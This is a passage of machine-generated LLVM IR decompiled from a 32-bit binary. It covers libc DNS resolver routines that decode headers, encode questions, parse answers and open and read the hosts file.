  %v4_804d765 = inttoptr i32 %v3_804d765 to i8*
  store i8 %v1_804d765, i8* %v4_804d765, align 1
  %v0_804d768 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d768 = add i32 %v0_804d768, 45
  %v2_804d768 = inttoptr i32 %v1_804d768 to i8*
  %v3_804d768 = load i8, i8* %v2_804d768, align 1
  %v2_804d76c = load i32, i32* %esi.global-to-local, align 4
  %v3_804d76c = add i32 %v2_804d76c, 10
  %v4_804d76c = inttoptr i32 %v3_804d76c to i8*
  store i8 %v3_804d768, i8* %v4_804d76c, align 1
  %v0_804d76f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d76f = add i32 %v0_804d76f, 44
  %v2_804d76f = inttoptr i32 %v1_804d76f to i32*
  %v3_804d76f = load i32, i32* %v2_804d76f, align 4
  %v1_804d772 = trunc i32 %v3_804d76f to i8
  %v2_804d772 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d772 = add i32 %v2_804d772, 11
  %v4_804d772 = inttoptr i32 %v3_804d772 to i8*
  store i8 %v1_804d772, i8* %v4_804d772, align 1
  %v2_804d77a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d77a

dec_label_pc_804d77a:                             ; preds = %entry, %dec_label_pc_804d6e4
  %v2_804d77a = phi i32 [ %v0_804d6cd, %entry ], [ %v2_804d77a.pre, %dec_label_pc_804d6e4 ]
  %v0_804d77c = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_804d6e4 ]
  store i32 %v2_804d77a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d77c

; uselistorder directives
  uselistorder i32 41, { 1, 0 }
  uselistorder label %dec_label_pc_804d77a, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d780 = load i32, i32* @ebx, align 4
  store i32 %v0_804d780, i32* %stack_var_-4, align 4
  %v4_804d781 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_804d781, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_804d789 = load i8, i8* %tmp2, align 1
  %v3_804d789 = zext i8 %v2_804d789 to i32
  %v1_804d78c = add i32 %v4_804d781, 1
  %v2_804d78c = inttoptr i32 %v1_804d78c to i8*
  %v3_804d78c = load i8, i8* %v2_804d78c, align 1
  %v4_804d78c = zext i8 %v3_804d78c to i32
  %v2_804d790 = mul nuw nsw i32 %v3_804d789, 256
  %v2_804d793 = or i32 %v4_804d78c, %v2_804d790
  %v2_804d795 = inttoptr i32 %tmp to i32*
  store i32 %v2_804d793, i32* %v2_804d795, align 4
  %v0_804d797 = load i32, i32* @ecx, align 4
  %v1_804d797 = add i32 %v0_804d797, 2
  %v2_804d797 = inttoptr i32 %v1_804d797 to i8*
  %v3_804d797 = load i8, i8* %v2_804d797, align 1
  %tmp6 = icmp slt i8 %v3_804d797, 0
  %v2_804d79b = zext i1 %tmp6 to i32
  %v1_804d79e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d79e = add i32 %v1_804d79e, 4
  %v3_804d79e = inttoptr i32 %v2_804d79e to i32*
  store i32 %v2_804d79b, i32* %v3_804d79e, align 4
  %v0_804d7a1 = load i32, i32* @ecx, align 4
  %v1_804d7a1 = add i32 %v0_804d7a1, 2
  %v2_804d7a1 = inttoptr i32 %v1_804d7a1 to i8*
  %v3_804d7a1 = load i8, i8* %v2_804d7a1, align 1
  %v3_804d7a4 = udiv i8 %v3_804d7a1, 8
  %tmp7 = urem i8 %v3_804d7a4, 16
  %v1_804d7a7 = zext i8 %tmp7 to i32
  %v1_804d7aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7aa = add i32 %v1_804d7aa, 8
  %v3_804d7aa = inttoptr i32 %v2_804d7aa to i32*
  store i32 %v1_804d7a7, i32* %v3_804d7aa, align 4
  %v0_804d7ad = load i32, i32* @ecx, align 4
  %v1_804d7ad = add i32 %v0_804d7ad, 2
  %v2_804d7ad = inttoptr i32 %v1_804d7ad to i8*
  %v3_804d7ad = load i8, i8* %v2_804d7ad, align 1
  %div = udiv i8 %v3_804d7ad, 4
  %tmp8 = urem i8 %div, 2
  %v1_804d7b4 = zext i8 %tmp8 to i32
  %v1_804d7b7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7b7 = add i32 %v1_804d7b7, 12
  %v3_804d7b7 = inttoptr i32 %v2_804d7b7 to i32*
  store i32 %v1_804d7b4, i32* %v3_804d7b7, align 4
  %v0_804d7ba = load i32, i32* @ecx, align 4
  %v1_804d7ba = add i32 %v0_804d7ba, 2
  %v2_804d7ba = inttoptr i32 %v1_804d7ba to i8*
  %v3_804d7ba = load i8, i8* %v2_804d7ba, align 1
  %div5 = udiv i8 %v3_804d7ba, 2
  %tmp9 = urem i8 %div5, 2
  %v1_804d7c0 = zext i8 %tmp9 to i32
  %v1_804d7c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7c3 = add i32 %v1_804d7c3, 16
  %v3_804d7c3 = inttoptr i32 %v2_804d7c3 to i32*
  store i32 %v1_804d7c0, i32* %v3_804d7c3, align 4
  %v0_804d7c6 = load i32, i32* @ecx, align 4
  %v1_804d7c6 = add i32 %v0_804d7c6, 2
  %v2_804d7c6 = inttoptr i32 %v1_804d7c6 to i8*
  %v3_804d7c6 = load i8, i8* %v2_804d7c6, align 1
  %tmp10 = urem i8 %v3_804d7c6, 2
  %v1_804d7ca = zext i8 %tmp10 to i32
  %v1_804d7cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7cd = add i32 %v1_804d7cd, 20
  %v3_804d7cd = inttoptr i32 %v2_804d7cd to i32*
  store i32 %v1_804d7ca, i32* %v3_804d7cd, align 4
  %v0_804d7d0 = load i32, i32* @ecx, align 4
  %v1_804d7d0 = add i32 %v0_804d7d0, 3
  %v2_804d7d0 = inttoptr i32 %v1_804d7d0 to i8*
  %v3_804d7d0 = load i8, i8* %v2_804d7d0, align 1
  %tmp11 = icmp slt i8 %v3_804d7d0, 0
  %v2_804d7d4 = zext i1 %tmp11 to i32
  %v1_804d7d7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7d7 = add i32 %v1_804d7d7, 24
  %v3_804d7d7 = inttoptr i32 %v2_804d7d7 to i32*
  store i32 %v2_804d7d4, i32* %v3_804d7d7, align 4
  %v0_804d7da = load i32, i32* @ecx, align 4
  %v1_804d7da = add i32 %v0_804d7da, 3
  %v2_804d7da = inttoptr i32 %v1_804d7da to i8*
  %v3_804d7da = load i8, i8* %v2_804d7da, align 1
  %tmp12 = urem i8 %v3_804d7da, 16
  %v1_804d7de = zext i8 %tmp12 to i32
  %v1_804d7e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7e1 = add i32 %v1_804d7e1, 28
  %v3_804d7e1 = inttoptr i32 %v2_804d7e1 to i32*
  store i32 %v1_804d7de, i32* %v3_804d7e1, align 4
  %v0_804d7e4 = load i32, i32* @ecx, align 4
  %v1_804d7e4 = add i32 %v0_804d7e4, 4
  %v2_804d7e4 = inttoptr i32 %v1_804d7e4 to i8*
  %v3_804d7e4 = load i8, i8* %v2_804d7e4, align 1
  %v4_804d7e4 = zext i8 %v3_804d7e4 to i32
  %v1_804d7e8 = add i32 %v0_804d7e4, 5
  %v2_804d7e8 = inttoptr i32 %v1_804d7e8 to i8*
  %v3_804d7e8 = load i8, i8* %v2_804d7e8, align 1
  %v4_804d7e8 = zext i8 %v3_804d7e8 to i32
  %v2_804d7ec = mul nuw nsw i32 %v4_804d7e4, 256
  %v2_804d7ef = or i32 %v4_804d7e8, %v2_804d7ec
  %v1_804d7f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d7f1 = add i32 %v1_804d7f1, 32
  %v3_804d7f1 = inttoptr i32 %v2_804d7f1 to i32*
  store i32 %v2_804d7ef, i32* %v3_804d7f1, align 4
  %v0_804d7f4 = load i32, i32* @ecx, align 4
  %v1_804d7f4 = add i32 %v0_804d7f4, 6
  %v2_804d7f4 = inttoptr i32 %v1_804d7f4 to i8*
  %v3_804d7f4 = load i8, i8* %v2_804d7f4, align 1
  %v4_804d7f4 = zext i8 %v3_804d7f4 to i32
  %v1_804d7f8 = add i32 %v0_804d7f4, 7
  %v2_804d7f8 = inttoptr i32 %v1_804d7f8 to i8*
  %v3_804d7f8 = load i8, i8* %v2_804d7f8, align 1
  %v4_804d7f8 = zext i8 %v3_804d7f8 to i32
  %v2_804d7fc = mul nuw nsw i32 %v4_804d7f4, 256
  %v2_804d7ff = or i32 %v4_804d7f8, %v2_804d7fc
  %v1_804d801 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d801 = add i32 %v1_804d801, 36
  %v3_804d801 = inttoptr i32 %v2_804d801 to i32*
  store i32 %v2_804d7ff, i32* %v3_804d801, align 4
  %v0_804d804 = load i32, i32* @ecx, align 4
  %v1_804d804 = add i32 %v0_804d804, 8
  %v2_804d804 = inttoptr i32 %v1_804d804 to i8*
  %v3_804d804 = load i8, i8* %v2_804d804, align 1
  %v4_804d804 = zext i8 %v3_804d804 to i32
  %v1_804d808 = add i32 %v0_804d804, 9
  %v2_804d808 = inttoptr i32 %v1_804d808 to i8*
  %v3_804d808 = load i8, i8* %v2_804d808, align 1
  %v4_804d808 = zext i8 %v3_804d808 to i32
  %v2_804d80c = mul nuw nsw i32 %v4_804d804, 256
  %v2_804d80f = or i32 %v4_804d808, %v2_804d80c
  %v1_804d811 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d811 = add i32 %v1_804d811, 40
  %v3_804d811 = inttoptr i32 %v2_804d811 to i32*
  store i32 %v2_804d80f, i32* %v3_804d811, align 4
  %v0_804d814 = load i32, i32* @ecx, align 4
  %v1_804d814 = add i32 %v0_804d814, 10
  %v2_804d814 = inttoptr i32 %v1_804d814 to i8*
  %v3_804d814 = load i8, i8* %v2_804d814, align 1
  %v4_804d814 = zext i8 %v3_804d814 to i32
  %v1_804d818 = add i32 %v0_804d814, 11
  %v2_804d818 = inttoptr i32 %v1_804d818 to i8*
  %v3_804d818 = load i8, i8* %v2_804d818, align 1
  %v4_804d818 = zext i8 %v3_804d818 to i32
  %v2_804d81c = mul nuw nsw i32 %v4_804d814, 256
  %v2_804d81f = or i32 %v4_804d818, %v2_804d81c
  %v1_804d821 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d821 = add i32 %v1_804d821, 44
  %v3_804d821 = inttoptr i32 %v2_804d821 to i32*
  store i32 %v2_804d81f, i32* %v3_804d821, align 4
  %v2_804d829 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d829, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804d82c = load i32, i32* @edi, align 4
  %v0_804d82d = load i32, i32* @esi, align 4
  %v0_804d82e = load i32, i32* @ebx, align 4
  store i32 %v0_804d82e, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_804d83b = load i32, i32* @eax, align 4
  %v1_804d83e = inttoptr i32 %tmp3 to i32*
  %v2_804d83e = load i32, i32* %v1_804d83e, align 4
  %v7_804d840 = inttoptr i32 %v2_804d83e to i8*
  %v8_804d840 = call i32 @__encode_dotted(i8* %v7_804d840, i32 %tmp2, i32 %tmp, i32 %v0_804d83b, i32 %v0_804d82e, i32 %v0_804d82d, i32 %v0_804d82c)
  store i32 %v8_804d840, i32* @ecx, align 4
  %v2_804d84a = icmp slt i32 %v8_804d840, 0
  br i1 %v2_804d84a, label %dec_label_pc_804d879, label %dec_label_pc_804d84e

dec_label_pc_804d84e:                             ; preds = %entry
  %v0_804d84e = load i32, i32* @ebx, align 4
  %v2_804d84e = sub i32 %v0_804d84e, %v8_804d840
  %v1_804d850 = add i32 %v2_804d84e, -3
  %v6_804d850 = sub i32 2, %v2_804d84e
  %v7_804d850 = and i32 %v6_804d850, %v2_804d84e
  %v8_804d850 = icmp slt i32 %v7_804d850, 0
  %v9_804d850 = icmp eq i32 %v1_804d850, 0
  %v10_804d850 = icmp slt i32 %v1_804d850, 0
  %v3_804d853 = icmp eq i1 %v10_804d850, %v8_804d850
  %v4_804d853 = icmp eq i1 %v9_804d850, false
  %v5_804d853 = and i1 %v4_804d853, %v3_804d853
  br i1 %v5_804d853, label %dec_label_pc_804d85a, label %dec_label_pc_804d855

dec_label_pc_804d855:                             ; preds = %dec_label_pc_804d84e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_804d879

dec_label_pc_804d85a:                             ; preds = %dec_label_pc_804d84e
  %v0_804d85a = load i32, i32* @edi, align 4
  %v2_804d85a = add i32 %v0_804d85a, %v8_804d840
  store i32 %v2_804d85a, i32* @edx, align 4
  %v1_804d85d = add i32 %v8_804d840, 4
  store i32 %v1_804d85d, i32* @ecx, align 4
  %v0_804d860 = load i32, i32* @esi, align 4
  %v1_804d860 = add i32 %v0_804d860, 5
  %v2_804d860 = inttoptr i32 %v1_804d860 to i8*
  %v3_804d860 = load i8, i8* %v2_804d860, align 1
  %v3_804d864 = inttoptr i32 %v2_804d85a to i8*
  store i8 %v3_804d860, i8* %v3_804d864, align 1
  %v0_804d866 = load i32, i32* @esi, align 4
  %v1_804d866 = add i32 %v0_804d866, 4
  %v2_804d866 = inttoptr i32 %v1_804d866 to i32*
  %v3_804d866 = load i32, i32* %v2_804d866, align 4
  %v1_804d869 = trunc i32 %v3_804d866 to i8
  %v2_804d869 = load i32, i32* @edx, align 4
  %v3_804d869 = add i32 %v2_804d869, 1
  %v4_804d869 = inttoptr i32 %v3_804d869 to i8*
  store i8 %v1_804d869, i8* %v4_804d869, align 1
  %v0_804d86c = load i32, i32* @esi, align 4
  %v1_804d86c = add i32 %v0_804d86c, 9
  %v2_804d86c = inttoptr i32 %v1_804d86c to i8*
  %v3_804d86c = load i8, i8* %v2_804d86c, align 1
  %v2_804d870 = load i32, i32* @edx, align 4
  %v3_804d870 = add i32 %v2_804d870, 2
  %v4_804d870 = inttoptr i32 %v3_804d870 to i8*
  store i8 %v3_804d86c, i8* %v4_804d870, align 1
  %v0_804d873 = load i32, i32* @esi, align 4
  %v1_804d873 = add i32 %v0_804d873, 8
  %v2_804d873 = inttoptr i32 %v1_804d873 to i32*
  %v3_804d873 = load i32, i32* %v2_804d873, align 4
  %v1_804d876 = trunc i32 %v3_804d873 to i8
  %v2_804d876 = load i32, i32* @edx, align 4
  %v3_804d876 = add i32 %v2_804d876, 3
  %v4_804d876 = inttoptr i32 %v3_804d876 to i8*
  store i8 %v1_804d876, i8* %v4_804d876, align 1
  %v0_804d879.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d879

dec_label_pc_804d879:                             ; preds = %entry, %dec_label_pc_804d855, %dec_label_pc_804d85a
  %v0_804d879 = phi i32 [ %v8_804d840, %entry ], [ -1, %dec_label_pc_804d855 ], [ %v0_804d879.pre, %dec_label_pc_804d85a ]
  %v2_804d87b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d87b, i32* @ebx, align 4
  store i32 %v0_804d82c, i32* @edi, align 4
  ret i32 %v0_804d879

; uselistorder directives
  uselistorder i32 %v1_804d850, { 1, 0 }
  uselistorder i32 %v2_804d84e, { 0, 2, 1 }
  uselistorder i32 %v8_804d840, { 1, 2, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_804d879, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_804d88b = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_804d893 = icmp slt i32 %v2_804d88b, 0
  br i1 %v2_804d893, label %dec_label_pc_804d89a, label %dec_label_pc_804d897

dec_label_pc_804d897:                             ; preds = %entry
  %v1_804d897 = add i32 %v2_804d88b, 4
  br label %dec_label_pc_804d89a

dec_label_pc_804d89a:                             ; preds = %entry, %dec_label_pc_804d897
  %v0_804d89d = phi i32 [ %v2_804d88b, %entry ], [ %v1_804d897, %dec_label_pc_804d897 ]
  ret i32 %v0_804d89d

; uselistorder directives
  uselistorder label %dec_label_pc_804d89a, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d8a0 = load i32, i32* @ebp, align 4
  %v0_804d8a1 = load i32, i32* @edi, align 4
  %v0_804d8a2 = load i32, i32* @esi, align 4
  %v0_804d8a3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8a3, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_804d8c4 = ptrtoint i32* %stack_var_-272 to i32
  %v4_804d8d1 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_804d8c4, i32 256)
  store i32 %v4_804d8d1, i32* @edi, align 4
  %v3_804d8db = icmp slt i32 %v4_804d8d1, 0
  br i1 %v3_804d8db, label %dec_label_pc_804d98c, label %dec_label_pc_804d8e3

dec_label_pc_804d8e3:                             ; preds = %entry
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  %v3_804d8e3 = add i32 %v0_804d8e3, %v4_804d8d1
  %v0_804d8e5 = load i32, i32* @esi, align 4
  %v2_804d8e5 = sub i32 %v0_804d8e5, %v3_804d8e3
  %v1_804d8eb = add i32 %v2_804d8e5, -10
  %v10_804d8eb = icmp slt i32 %v1_804d8eb, 0
  store i32 %v1_804d8eb, i32* @esi, align 4
  %v1_804d8f2 = icmp eq i1 %v10_804d8eb, false
  br i1 %v1_804d8f2, label %dec_label_pc_804d8fb, label %dec_label_pc_804d8f4

dec_label_pc_804d8f4:                             ; preds = %dec_label_pc_804d8e3
  br label %dec_label_pc_804d98c

dec_label_pc_804d8fb:                             ; preds = %dec_label_pc_804d8e3
  %v6_804d902 = add i32 %v3_804d8e3, %tmp4
  store i32 %v6_804d902, i32* @ebx, align 4
  %v1_804d90e = bitcast i32* %stack_var_-272 to i8*
  %v2_804d90e = call i32 @__GI_strdup(i8* %v1_804d90e)
  %v1_804d913 = load i32, i32* @ebp, align 4
  %v2_804d913 = inttoptr i32 %v1_804d913 to i32*
  store i32 %v2_804d90e, i32* %v2_804d913, align 4
  %v0_804d916 = load i32, i32* @ebx, align 4
  %v1_804d916 = add i32 %v0_804d916, 4
  store i32 %v1_804d916, i32* %esi.global-to-local, align 4
  %v1_804d919 = inttoptr i32 %v0_804d916 to i8*
  %v2_804d919 = load i8, i8* %v1_804d919, align 1
  %v3_804d919 = zext i8 %v2_804d919 to i32
  %v1_804d91c = add i32 %v0_804d916, 1
  %v2_804d91c = inttoptr i32 %v1_804d91c to i8*
  %v3_804d91c = load i8, i8* %v2_804d91c, align 1
  %v4_804d91c = zext i8 %v3_804d91c to i32
  %v2_804d920 = mul nuw nsw i32 %v3_804d919, 256
  %v2_804d923 = or i32 %v4_804d91c, %v2_804d920
  %v1_804d925 = load i32, i32* @ebp, align 4
  %v2_804d925 = add i32 %v1_804d925, 4
  %v3_804d925 = inttoptr i32 %v2_804d925 to i32*
  store i32 %v2_804d923, i32* %v3_804d925, align 4
  %v0_804d928 = load i32, i32* @ebx, align 4
  %v1_804d928 = add i32 %v0_804d928, 2
  %v2_804d928 = inttoptr i32 %v1_804d928 to i8*
  %v3_804d928 = load i8, i8* %v2_804d928, align 1
  %v4_804d928 = zext i8 %v3_804d928 to i32
  %v1_804d92c = add i32 %v0_804d928, 3
  %v2_804d92c = inttoptr i32 %v1_804d92c to i8*
  %v3_804d92c = load i8, i8* %v2_804d92c, align 1
  %v4_804d92c = zext i8 %v3_804d92c to i32
  %v2_804d930 = mul nuw nsw i32 %v4_804d928, 256
  %v2_804d933 = or i32 %v4_804d92c, %v2_804d930
  %v1_804d935 = load i32, i32* @ebp, align 4
  %v2_804d935 = add i32 %v1_804d935, 8
  %v3_804d935 = inttoptr i32 %v2_804d935 to i32*
  store i32 %v2_804d933, i32* %v3_804d935, align 4
  %v0_804d938 = load i32, i32* @ebx, align 4
  %v1_804d938 = add i32 %v0_804d938, 4
  %v2_804d938 = inttoptr i32 %v1_804d938 to i8*
  %v3_804d938 = load i8, i8* %v2_804d938, align 1
  %v4_804d938 = zext i8 %v3_804d938 to i32
  %v0_804d93c = load i32, i32* %esi.global-to-local, align 4
  %v1_804d93c = add i32 %v0_804d93c, 1
  %v2_804d93c = inttoptr i32 %v1_804d93c to i8*
  %v3_804d93c = load i8, i8* %v2_804d93c, align 1
  %v4_804d93c = zext i8 %v3_804d93c to i32
  %v2_804d940 = mul nuw i32 %v4_804d938, 16777216
  %v2_804d943 = mul nuw nsw i32 %v4_804d93c, 65536
  %v1_804d946 = add i32 %v0_804d93c, 2
  %v2_804d946 = inttoptr i32 %v1_804d946 to i8*
  %v3_804d946 = load i8, i8* %v2_804d946, align 1
  %v4_804d946 = zext i8 %v3_804d946 to i32
  %v2_804d94a = mul nuw nsw i32 %v4_804d946, 256
  %v2_804d94d = or i32 %v2_804d943, %v2_804d940
  %v1_804d94f = add i32 %v0_804d93c, 3
  %v2_804d94f = inttoptr i32 %v1_804d94f to i8*
  %v3_804d94f = load i8, i8* %v2_804d94f, align 1
  %v4_804d94f = zext i8 %v3_804d94f to i32
  %v2_804d953 = or i32 %v4_804d94f, %v2_804d94d
  %v2_804d955 = or i32 %v2_804d953, %v2_804d94a
  store i32 %v2_804d955, i32* @ecx, align 4
  %v1_804d957 = load i32, i32* @ebp, align 4
  %v2_804d957 = add i32 %v1_804d957, 12
  %v3_804d957 = inttoptr i32 %v2_804d957 to i32*
  store i32 %v2_804d955, i32* %v3_804d957, align 4
  %v0_804d95a = load i32, i32* @ebx, align 4
  %v1_804d95a = add i32 %v0_804d95a, 8
  %v2_804d95a = inttoptr i32 %v1_804d95a to i8*
  %v3_804d95a = load i8, i8* %v2_804d95a, align 1
  %v4_804d95a = zext i8 %v3_804d95a to i32
  %v1_804d95e = add i32 %v0_804d95a, 9
  %v2_804d95e = inttoptr i32 %v1_804d95e to i8*
  %v3_804d95e = load i8, i8* %v2_804d95e, align 1
  %v4_804d95e = zext i8 %v3_804d95e to i32
  %v2_804d962 = mul nuw nsw i32 %v4_804d95a, 256
  %v1_804d965 = add i32 %v0_804d95a, 10
  %v2_804d968 = or i32 %v4_804d95e, %v2_804d962
  store i32 %v2_804d968, i32* @edx, align 4
  %v1_804d96a = load i32, i32* @ebp, align 4
  %v2_804d96a = add i32 %v1_804d96a, 20
  %v3_804d96a = inttoptr i32 %v2_804d96a to i32*
  store i32 %v1_804d965, i32* %v3_804d96a, align 4
  %v0_804d96d = load i32, i32* @edx, align 4
  %v1_804d96d = load i32, i32* @ebp, align 4
  %v2_804d96d = add i32 %v1_804d96d, 16
  %v3_804d96d = inttoptr i32 %v2_804d96d to i32*
  store i32 %v0_804d96d, i32* %v3_804d96d, align 4
  %v1_804d977 = add i32 %v3_804d8e3, 10
  %v1_804d97a = load i32, i32* @ebp, align 4
  %v2_804d97a = add i32 %v1_804d97a, 24
  %v3_804d97a = inttoptr i32 %v2_804d97a to i32*
  store i32 %v1_804d977, i32* %v3_804d97a, align 4
  %v4_804d97d = load i32, i32* @edx, align 4
  %v5_804d981 = icmp slt i32 %v1_804d8eb, %v4_804d97d
  br i1 %v5_804d981, label %dec_label_pc_804d983, label %dec_label_pc_804d988

dec_label_pc_804d983:                             ; preds = %dec_label_pc_804d8fb
  br label %dec_label_pc_804d98c

dec_label_pc_804d988:                             ; preds = %dec_label_pc_804d8fb
  %v1_804d988 = load i32, i32* @edi, align 4
  %v2_804d988 = add i32 %v4_804d97d, 10
  %v3_804d988 = add i32 %v2_804d988, %v1_804d988
  br label %dec_label_pc_804d98c

dec_label_pc_804d98c:                             ; preds = %entry, %dec_label_pc_804d983, %dec_label_pc_804d8f4, %dec_label_pc_804d988
  %v0_804d992 = phi i32 [ %v4_804d8d1, %entry ], [ -1, %dec_label_pc_804d983 ], [ %v1_804d8eb, %dec_label_pc_804d8f4 ], [ %v3_804d988, %dec_label_pc_804d988 ]
  %v2_804d994 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d994, i32* @ebx, align 4
  store i32 %v0_804d8a2, i32* @esi, align 4
  store i32 %v0_804d8a1, i32* @edi, align 4
  store i32 %v0_804d8a0, i32* @ebp, align 4
  ret i32 %v0_804d992

; uselistorder directives
  uselistorder i32 %v1_804d8eb, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804d8e3, { 1, 0, 2 }
  uselistorder i32 %v4_804d8d1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804d98c, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_804d9a9 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805064d.110 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v3_804d9a9, i32* @eax, align 4
  %v1_804d9b1 = icmp eq i32 %v3_804d9a9, 0
  %v1_804d9b3 = icmp eq i1 %v1_804d9b1, false
  br i1 %v1_804d9b3, label %dec_label_pc_804d9c9, label %dec_label_pc_804d9b5

dec_label_pc_804d9b5:                             ; preds = %entry
  %v3_804d9c1 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8050658.111 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  br label %dec_label_pc_804d9c9

dec_label_pc_804d9c9:                             ; preds = %entry, %dec_label_pc_804d9b5
  %v0_804d9cc = phi i32 [ %v3_804d9a9, %entry ], [ %v3_804d9c1, %dec_label_pc_804d9b5 ]
  ret i32 %v0_804d9cc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80505fe.89 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_804d9c9, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_804d9cd = load i32, i32* @ebp, align 4
  %v0_804d9ce = load i32, i32* @edi, align 4
  %v0_804d9cf = load i32, i32* @esi, align 4
  %v0_804d9d0 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_804d9de = sub i32 0, %arg6
  %v1_804d9e0 = urem i32 %v1_804d9de, 4
  %v2_804d9e0 = icmp eq i32 %v1_804d9e0, 0
  store i32 %v1_804d9e0, i32* %eax.global-to-local, align 4
  br i1 %v2_804d9e0, label %dec_label_pc_804d9f1, label %dec_label_pc_804d9e5

dec_label_pc_804d9e5:                             ; preds = %entry
  %v2_804d9e5 = sub i32 %arg7, %v1_804d9e0
  %v7_804d9e5 = icmp ugt i32 %v1_804d9e0, %arg7
  br i1 %v7_804d9e5, label %dec_label_pc_804dc95, label %dec_label_pc_804d9ed

dec_label_pc_804d9ed:                             ; preds = %dec_label_pc_804d9e5
  %v2_804d9ed = add i32 %v1_804d9e0, %arg6
  store i32 %v2_804d9ed, i32* @ebx, align 4
  store i32 %v2_804d9e5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d9f1

dec_label_pc_804d9f1:                             ; preds = %entry, %dec_label_pc_804d9ed
  %v0_804d9fa = phi i32 [ %arg6, %entry ], [ %v2_804d9ed, %dec_label_pc_804d9ed ]
  %v0_804d9fd = phi i32 [ %arg7, %entry ], [ %v2_804d9e5, %dec_label_pc_804d9ed ]
  %tmp149 = icmp ult i32 %v0_804d9fd, 32
  br i1 %tmp149, label %dec_label_pc_804dc95, label %dec_label_pc_804d9fa

dec_label_pc_804d9fa:                             ; preds = %dec_label_pc_804d9f1
  %v1_804d9fa = add i32 %v0_804d9fa, 32
  store i32 %v1_804d9fa, i32* %eax.global-to-local, align 4
  %v1_804d9fd = add i32 %v0_804d9fd, -32
  store i32 %v1_804d9fd, i32* @ebp, align 4
  %v5_804da00 = inttoptr i32 %v1_804d9fa to i8*
  %v12_804da04 = icmp eq i32 %arg4, 1
  br i1 %v12_804da04, label %dec_label_pc_804db26, label %dec_label_pc_804da0f

dec_label_pc_804da0f:                             ; preds = %dec_label_pc_804d9fa
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_804da16 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_804da16, align 4
  %tmp150 = icmp ult i32 %v1_804d9fd, 4
  br i1 %tmp150, label %dec_label_pc_804dc95, label %dec_label_pc_804da22

dec_label_pc_804da22:                             ; preds = %dec_label_pc_804da0f
  %v0_804da22 = load i32, i32* %edx.global-to-local, align 4
  %v1_804da22 = add i32 %v0_804da22, -36
  store i32 %v1_804da22, i32* %eax.global-to-local, align 4
